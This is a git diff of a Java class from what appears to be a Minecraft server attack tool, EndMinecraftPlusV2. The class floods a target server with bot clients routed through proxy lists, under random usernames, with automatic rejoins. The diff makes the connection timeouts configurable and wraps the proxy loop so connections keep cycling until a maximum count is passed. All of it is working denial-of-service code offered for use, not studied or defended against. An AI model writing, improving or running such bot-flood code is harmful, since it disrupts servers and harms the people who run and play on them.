@@ -170,7 +170,7 @@ public class NewBotAttack extends IAttack {
                         return;
                     }
 
-                    OtherUtils.doSleep(5 * 1000);
+                    OtherUtils.doSleep(ConfigUtil.ConnectTimeout);
                     LogUtil.doLog(0, "当前连接数: " + clients.size() + "个", "BotAttack");
                     cleanClients();
                 } catch (Exception e) {
@@ -244,40 +244,45 @@ public class NewBotAttack extends IAttack {
                 break;
         }
 
-        for (String p: ProxyUtil.proxies) {
-            try {
-                SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
+        boolean run = true;
+        while (run) {
+            for (String p: ProxyUtil.proxies) {
+                try {
+                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
 
-                String[] _p = p.split(":");
-                Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
-                String[] User = AttackManager.getRandomUser().split("@");
-                Session client = createClient(ip, port, User[0], proxy);
-                client.setReadTimeout(5 * 1000);
-                client.setWriteTimeout(5 * 1000);
-                clientName.put(client, User[0]);
-                clients.add(client);
-                ProxyUtil.clientsProxy.put(client, proxy);
+                    String[] _p = p.split(":");
+                    Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
+                    String[] User = AttackManager.getRandomUser().split("@");
+                    Session client = createClient(ip, port, User[0], proxy);
+                    client.setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
+                    client.setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
+                    clientName.put(client, User[0]);
+                    clients.add(client);
+                    ProxyUtil.clientsProxy.put(client, proxy);
 
-                if (this.attack_motdbefore) {
-                    pool.submit(() -> {
-                        getMotd(proxy, ip, port);
+                    if (this.attack_motdbefore) {
+                        pool.submit(() -> {
+                            getMotd(proxy, ip, port);
+                            client.connect(false);
+                        });
+                    } else {
                         client.connect(false);
-                    });
-                } else {
-                    client.connect(false);
-                }
+                    }
 
-                if (this.attack_maxconnect > 0 && (clients.size() > this.attack_maxconnect)) {
-                    return;
-                }
+                    if (this.attack_joinsleep > 0) {
+                        OtherUtils.doSleep(attack_joinsleep);
+                    }
 
-                if (this.attack_joinsleep > 0) {
-                    OtherUtils.doSleep(attack_joinsleep);
+                    if (clients.size() > this.attack_maxconnect) {
+                        run = false;
+                        break;
+                    }
+                } catch (Exception e) {
+                    LogUtil.doLog(1, "发生错误: " + e, null);
                 }
-            } catch (Exception e) {
-                LogUtil.doLog(1, "发生错误: " + e, null);
             }
         }
+
     }
 
     public Session createClient(final String ip, int port, final String username, Proxy proxy) {
@@ -380,8 +385,8 @@ public class NewBotAttack extends IAttack {
                                     OtherUtils.doSleep(ConfigUtil.RejoinDelay);
 
                                     Session rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
-                                    rejoinClient.setReadTimeout(5000);
-                                    rejoinClient.setWriteTimeout(5000);
+                                    rejoinClient.setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
+                                    rejoinClient.setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
 
                                     rejoin++;
                                     LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
